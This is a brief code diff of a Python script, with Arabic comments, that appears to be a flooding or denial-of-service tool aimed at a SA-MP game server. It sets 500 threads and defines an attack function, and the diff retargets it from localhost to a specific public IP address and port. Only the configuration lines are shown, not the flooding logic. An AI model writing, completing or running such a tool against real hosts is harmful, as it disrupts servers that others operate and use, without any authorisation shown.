@@ -2,8 +2,8 @@ import socket
 import threading
 import random
 
-target_ip = '127.0.0.1'  # حدد عنوان IP للسيرفر الهدف
-target_port = 7777  # حدد المنفذ الهدف (عادةً ما يكون 7777 لـ SAMP)
+target_ip = '23.88.73.88'  # حدد عنوان IP للسيرفر الهدف
+target_port = 16414  # حدد المنفذ الهدف (عادةً ما يكون 7777 لـ SAMP)
 num_threads = 500  # عدد الخيوط
 
 def attack():
